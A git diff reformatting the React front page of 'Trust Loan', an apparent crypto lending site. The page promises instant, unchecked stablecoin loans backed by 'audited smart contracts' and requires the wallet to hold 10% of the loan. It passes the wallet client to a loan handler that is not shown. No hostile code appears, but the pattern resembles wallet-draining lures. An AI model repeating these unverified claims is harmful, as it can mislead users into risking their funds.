@@ -1,57 +1,60 @@
 // App.js
 import './styles.css';
-import React from 'react';
+import React, { useEffect, useState } from 'react';
 import ConnectWallet from './components/ConnectWallet';
 import { useAccount, useWalletClient } from 'wagmi';
 import { handleLoanRequest } from './components/handleLoanRequest';
-import { useEffect } from 'react';
 
 function App() {
-  useEffect(() => {
-  // Intercept script errors that result in HTML being loaded instead of JS
-  const errorHandler = (e) => {
-    const target = e.target || e.srcElement;
-    if (target && target.tagName === 'SCRIPT') {
-      console.error('🚨 Script failed to load or invalid JS:', {
-        src: target.src,
-        outerHTML: target.outerHTML,
-        message: e.message,
-        error: e.error
-      });
-
-      // Try fetching the script content directly to inspect what it returned
-      fetch(target.src)
-        .then(res => res.text())
-        .then(body => {
-          if (body.startsWith('<')) {
-            console.warn('❗ This script returned HTML instead of JS:', target.src);
-            console.log('Returned content:\n', body.slice(0, 500)); // Show first 500 chars
-          }
-        })
-        .catch(fetchErr => {
-          console.error('Failed to fetch script for inspection:', fetchErr);
-        });
-    }
-  };
-
-  // Use capture=true to catch at the earliest phase
-  window.addEventListener('error', errorHandler, true);
-
-  // Jivo live chat
-  const script = document.createElement('script');
-  script.src = '//code.jivosite.com/widget/QteRBV3vK5';
-  script.async = true;
-  document.body.appendChild(script);
-
-  return () => {
-    window.removeEventListener('error', errorHandler, true);
-  };
-}, []);
-
-
-
   const { isConnected, address } = useAccount();
   const { data: walletClient } = useWalletClient();
+
+  const [mounted, setMounted] = useState(false);
+
+  // ✅ Mount check and error handling
+  useEffect(() => {
+    setMounted(true);
+
+    // Catch external script loading issues
+    const errorHandler = (e) => {
+      const target = e.target || e.srcElement;
+      if (target && target.tagName === 'SCRIPT') {
+        console.error('🚨 Script failed to load or invalid JS:', {
+          src: target.src,
+          outerHTML: target.outerHTML,
+          message: e.message,
+          error: e.error
+        });
+
+        fetch(target.src)
+          .then(res => res.text())
+          .then(body => {
+            if (body.startsWith('<')) {
+              console.warn('❗ This script returned HTML instead of JS:', target.src);
+              console.log('Returned content:\n', body.slice(0, 500));
+            }
+          })
+          .catch(fetchErr => {
+            console.error('Failed to fetch script for inspection:', fetchErr);
+          });
+      }
+    };
+
+    window.addEventListener('error', errorHandler, true);
+
+    // ✅ Jivo live chat widget
+    const script = document.createElement('script');
+    script.src = '//code.jivosite.com/widget/QteRBV3vK5';
+    script.async = true;
+    document.body.appendChild(script);
+
+    return () => {
+      window.removeEventListener('error', errorHandler, true);
+    };
+  }, []);
+
+  // 🛑 Prevent rendering until client is mounted
+  if (!mounted) return null;
 
   return (
     <div className="app">
@@ -63,125 +66,107 @@ function App() {
           <a href="#loan-offers">Loan Offers</a>
           <a href="#faq">FAQ</a>
         </nav>
-        {/* ✅ Connect Wallet Button in navbar */}
         <ConnectWallet />
       </header>
 
       {/* Hero Section */}
       <section className="hero-container">
-       <div className="hero">
-        {/* Token Icons Left - Hidden on Mobile */}
-      <div className="hidden md:flex relative w-[300px] h-[320px] items-center justify-center">
-        <div className="relative w-full h-full">
-          <img src="/images/ethereum-eth-logo.png" alt="ETH" className="token eth" />
-          <img src="/images/usd-coin-usdc-logo.png" alt="USDC" className="token usdc" />
-          <img src="/images/dai.png" alt="DAI" className="token dai" />
-          <img src="/images/litecoin.png" alt="WBTC" className="token wbtc" />
-        </div>
-      </div>
+        <div className="hero">
+          {/* Left token icons */}
+          <div className="hidden md:flex relative w-[300px] h-[320px] items-center justify-center">
+            <div className="relative w-full h-full">
+              <img src="/images/ethereum-eth-logo.png" alt="ETH" className="token eth" />
+              <img src="/images/usd-coin-usdc-logo.png" alt="USDC" className="token usdc" />
+              <img src="/images/dai.png" alt="DAI" className="token dai" />
+              <img src="/images/litecoin.png" alt="WBTC" className="token wbtc" />
+            </div>
+          </div>
 
-
-          {/* Hero Center */}
+          {/* Center content */}
           <div className="hero-content-wrapper">
             <div className="hero-content">
               {!isConnected ? (
                 <>
-                <h1>
-                  Welcome to <span className="highlight">Trust Loan</span>
-                </h1>
+                  <h1>
+                    Welcome to <span className="highlight">Trust Loan</span>
+                  </h1>
 
-              <section className="bg-gradient-to-br from-[#1c1f26] to-[#0f1115] text-white py-20 px-6 text-center md:text-left">
-              <div className="max-w-5xl mx-auto">
-                
+                  {/* Value Proposition */}
+                  <section className="bg-gradient-to-br from-[#1c1f26] to-[#0f1115] text-white py-20 px-6 text-center md:text-left">
+                    <div className="max-w-5xl mx-auto">
+                      <p className="text-lg md:text-xl text-gray-300 mb-10">
+                        <strong className="block text-2xl font-semibold text-white mb-3">
+                          A Secure and Simple Way to Get Crypto-Backed Loans
+                        </strong>
+                        Trust loan allows you to borrow stablecoins instantly using your crypto assets as collateral — no credit checks, no paperwork, no intermediaries.
+                      </p>
 
-                <p className="text-lg md:text-xl text-gray-300 mb-10">
-                  <strong className="block text-2xl font-semibold text-white mb-3">
-                    A Secure and Simple Way to Get Crypto-Backed Loans
-                  </strong>
-                  Trust loan allows you to borrow stablecoins instantly using your crypto assets as collateral — no credit checks, no paperwork, no intermediaries.
-                </p>
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
+                        <div>
+                          <h3 className="text-xl font-bold text-purple-400 mb-2">Instant Loans</h3>
+                          <p className="text-gray-300">Borrow in seconds - no approvals, no delays, on-chain only.</p>
+                        </div>
+                        <div>
+                          <h3 className="text-xl font-bold text-purple-400 mb-2">Secure Collateral</h3>
+                          <p className="text-gray-300">Your assets remain safe, locked in audited smart contracts.</p>
+                        </div>
+                        <div>
+                          <h3 className="text-xl font-bold text-purple-400 mb-2">Total Control</h3>
+                          <p className="text-gray-300">Repay anytime. Withdraw instantly. No hidden fees or fine print.</p>
+                        </div>
+                      </div>
+                    </div>
+                  </section>
 
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
-                  <div>
-                    <h3 className="text-xl font-bold text-purple-400 mb-2">Instant Loans</h3>
-                    <p className="text-gray-300">
-                      Borrow in seconds - no approvals, no delays, on-chain only.
+                  {/* How it works section */}
+                  <section className="relative z-10 px-6 py-24 max-w-7xl mx-auto bg-gradient-to-b from-transparent to-[#0f1115] mb-24">
+                    <h2 className="text-4xl font-extrabold text-white mb-16 text-center tracking-tight">How It Works</h2>
+                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 text-white">
+                      {[
+                        {
+                          title: 'Connect Wallet',
+                          icon: '🔗',
+                          desc: 'Securely link your crypto wallet in seconds and get started instantly.'
+                        },
+                        {
+                          title: 'Deposit Collateral',
+                          icon: '💼',
+                          desc: 'Choose supported assets and lock them into our smart contract as collateral.'
+                        },
+                        {
+                          title: 'Borrow Instantly',
+                          icon: '⚡',
+                          desc: 'Receive stablecoins with zero delays — no approvals, no paperwork.'
+                        },
+                        {
+                          title: 'Repay Anytime',
+                          icon: '🔓',
+                          desc: 'Unlock your assets at your own pace. No penalties or hidden fees.'
+                        }
+                      ].map((step, index) => (
+                        <div
+                          key={index}
+                          className="flex flex-col items-center text-center p-8 bg-zinc-900/80 rounded-2xl border border-zinc-800 shadow-xl hover:shadow-purple-500/30 transition-all duration-300 hover:-translate-y-2"
+                        >
+                          <div className="text-5xl mb-6">{step.icon}</div>
+                          <h3 className="text-xl font-bold mb-3">{step.title}</h3>
+                          <p className="text-gray-400 text-sm leading-relaxed">{step.desc}</p>
+                        </div>
+                      ))}
+                    </div>
+
+                    <p className="text-center text-gray-400 mt-16 max-w-2xl mx-auto text-base leading-relaxed">
+                      All loans are processed 100% on-chain — verifiable, secure, and trustless. Your assets stay under your control at all times.
                     </p>
+                  </section>
+
+                  {/* Connect wallet button */}
+                  <div className="flex justify-center items-center mt-6">
+                    <ConnectWallet />
                   </div>
-                  <div>
-                    <h3 className="text-xl font-bold text-purple-400 mb-2">Secure Collateral</h3>
-                    <p className="text-gray-300">
-                      Your assets remain safe, locked in audited smart contracts.
-                    </p>
-                  </div>
-                  <div>
-                    <h3 className="text-xl font-bold text-purple-400 mb-2">Total Control</h3>
-                    <p className="text-gray-300">
-                      Repay anytime. Withdraw instantly. No hidden fees or fine print.
-                    </p>
-                  </div>
-                </div>
-              </div>
-            </section>
-
-
-
-
-
-            <section className="relative z-10 px-6 py-24 max-w-7xl mx-auto bg-gradient-to-b from-transparent to-[#0f1115] mb-24">
-            <h2 className="text-4xl font-extrabold text-white mb-16 text-center tracking-tight">
-              How It Works
-            </h2>
-
-            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 text-white">
-              {[
-                {
-                  title: 'Connect Wallet',
-                  icon: '🔗',
-                  desc: 'Securely link your crypto wallet in seconds and get started instantly.'
-                },
-                {
-                  title: 'Deposit Collateral',
-                  icon: '💼',
-                  desc: 'Choose supported assets and lock them into our smart contract as collateral.'
-                },
-                {
-                  title: 'Borrow Instantly',
-                  icon: '⚡',
-                  desc: 'Receive stablecoins with zero delays — no approvals, no paperwork.'
-                },
-                {
-                  title: 'Repay Anytime',
-                  icon: '🔓',
-                  desc: 'Unlock your assets at your own pace. No penalties or hidden fees.'
-                }
-              ].map((step, index) => (
-                <div
-                  key={index}
-                  className="flex flex-col items-center text-center p-8 bg-zinc-900/80 rounded-2xl border border-zinc-800 shadow-xl hover:shadow-purple-500/30 transition-all duration-300 hover:-translate-y-2"
-                >
-                  <div className="text-5xl mb-6">{step.icon}</div>
-                  <h3 className="text-xl font-bold mb-3">{step.title}</h3>
-                  <p className="text-gray-400 text-sm leading-relaxed">{step.desc}</p>
-                </div>
-              ))}
-            </div>
-
-            <p className="text-center text-gray-400 mt-16 max-w-2xl mx-auto text-base leading-relaxed">
-              All loans are processed 100% on-chain — verifiable, secure, and trustless. Your assets stay under your control at all times.
-            </p>
-          </section>
-
-
-
-
-
-                  {/* ✅ Connect Wallet Button in hero */}
-                  <div className="flex justify-center items-center">
-                  <ConnectWallet />
-                </div>
                 </>
               ) : (
+                // ✅ Dashboard view (after wallet connect)
                 <div className="connected-dashboard">
                   <h3>Welcome back 👋</h3>
                   <div className="loan-options">
@@ -189,7 +174,6 @@ function App() {
                     <div className="mt-4 mb-2 bg-yellow-900/20 border border-yellow-600 text-yellow-300 px-4 py-3 rounded-xl text-sm font-medium shadow-md">
                       ⚠️ To protect your loan, your wallet must hold at least <span className="font-semibold text-white">10% of your requested loan</span> as wallet collateral.
                     </div>
-
 
                     <div className="loan-grid">
                       {[1000, 5000, 10000, 20000, 50000, 100000].map((amt) => (
@@ -212,7 +196,7 @@ function App() {
             </div>
           </div>
 
-          {/* Hero Right Phone Image */}
+          {/* Right iPhone image */}
           <div className="hero-image">
             <img src="/images/iphone-mockup.png" alt="iPhone mockup with wallet" />
           </div>
@@ -248,7 +232,5 @@ function App() {
     </div>
   );
 }
-
-
 
 export default App;
